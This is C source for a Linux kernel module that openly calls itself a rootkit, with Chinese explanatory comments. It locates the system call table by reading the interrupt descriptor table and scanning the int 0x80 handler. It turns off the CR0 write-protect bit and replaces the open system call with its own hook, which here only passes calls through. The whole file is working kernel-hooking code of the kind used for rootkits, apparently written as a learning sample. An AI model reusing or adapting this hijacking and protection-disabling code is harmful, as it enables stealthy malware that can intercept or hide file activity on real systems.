#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
//#include <linux/string.h>
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("wanglei<sa615256@mail.ustc.edu.cn>");
MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");
void ** sys_call_table;
//extern void *memmem(const void *haystack, size_t haystacklen,const void *needle, size_t needlelen);
//内核中并没有实现memmem
char* myMemmem(char * a, int alen, char * b, int blen)
{
    int i, j;
    for(i=0  ; i<= (alen-blen) ; i++)
    {
        for (j = 0; j < blen; ++ j)
        {
            if (a[i + j] != b[j])
            {
                break;
            }
        }
        if (j >= blen)
        {
            return &a[i];
        }
    }
    return NULL;
}
struct {
    unsigned short  limit;
    unsigned int    base;
} __attribute__ ( ( packed ) ) idtr;

struct {
    unsigned short  offset_low;
    unsigned short  segment_select;
    unsigned char   reserved,   flags;
    unsigned short  offset_high;
} __attribute__ ( ( packed ) ) * idt;

void** find_sys_call_table(void)
{
    unsigned long system_call = 0;     // x80中断处理程序system_call 地址
    char *call_hex = "\xff\x14\x85";   // call 指令 机器码 "/xff" 和 "\xff"的区别，在linux中'\'才是转义符
    char *code_ptr = NULL;
    char *p = NULL;
    unsigned long sct = 0x0;           //sys_call_table addr
    int i = 0;

    // 获取中断描述符表寄存器的地址
    __asm__ ( "sidt %0": "=m" ( idtr ) );
    // 获取0x80中断处理程序的地址
    idt = ( void * ) ( idtr.base + 8 * 0x80 );
    system_call = ( idt->offset_high << 16 ) | idt->offset_low;

    // 搜索system_call代码
    code_ptr = (char *)system_call;
    //printk( "system_call address = %p\n", system_call);
    for(i = 0;i <100 ; i++) 
    {
        // 查找system_call的前100个字节
        if(    code_ptr[i]   == call_hex[0]
            && code_ptr[i+1] == call_hex[1]
            && code_ptr[i+2] == call_hex[2] ) 
        {
            p = &code_ptr[i] + 3;
            break;
        }
    }
    //memmem是一个C库函数，用于在一块内存中寻找匹配另一块内存的内容的第一个位置
    //p=(char *)myMemmem(code_ptr,100,"\xff\x14\x85",3);//得到 call 机器码 的地址
    //p=p+3;
    //这段代码等同于上面的for循环
    if ( p )
    {
        sct = *(unsigned long*)p;
        //p地址里面存放的内容才是sct
    }
    return (void**)sct;
}


asmlinkage int (*original_call) (const char*, int, int);

//CR0的位16是写保护（Write Proctect）标志。
//当设置该标志时，处理器会禁止超级用户程序（例如特权级0的程序）向用户级只读页面执行写操作
//intel风格的汇编代码
// __asm
// {
//     mov eax,cr0
//     and eax,~0x10000//第16位
//     mov cro,eax
// }
////恢复写保护
// __asm
// {
//     mov eax,cr0
//     or eax,0x10000//第16位
//     mov cro,eax
// }
static void disable_page_protection(void) {

    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value));
    if (value & 0x00010000) {
            value &= ~0x00010000;
            asm volatile("mov %0,%%cr0": : "r" (value));
    }
}

static void enable_page_protection(void) {

    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value));
    if (!(value & 0x00010000)) {
            value |= 0x00010000;
            asm volatile("mov %0,%%cr0": : "r" (value));
    }
}
//上面两个函数是把全局写保护关掉(和开头定义的宏作用相同)，下面这个函数，把特定的地址所在的页表的写保护关掉
static void set_page_rw( void ** addr)
{
	unsigned int level;
    pte_t *pte = lookup_address((unsigned long)addr, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}


asmlinkage int our_sys_open(const char* file, int flags, int mode)
{
   //printk("%s was opened\n",file);
   //这里的file是文件的绝对路径
   return original_call(file, flags, mode);
}

int init_module()
{   
    printk("rootkit module loading......\n");
    GPF_DISABLE;
   if ( (sys_call_table = find_sys_call_table()))  
    {
        //sys_call_table = find_sys_call_table();
        printk( "sys_call_table = %p\n", sys_call_table );
    }
    // manually get sys_call_table address in System.map c15ef0a0
    //sys_call_table = (void**) 0xc15ef0a0;
    //(void**)
    original_call = sys_call_table[__NR_open];
   // set_page_rw(sys_call_table);
   // Hook: if not set page rw ,may crashes here
    sys_call_table[__NR_open] = our_sys_open;
    printk("rootkit module load succeddfully\n");
    return 0;
}

void cleanup_module()
{
   // Restore the original call
   printk("rootkit module was remmoved!\n");
   sys_call_table[__NR_open] = original_call;
}
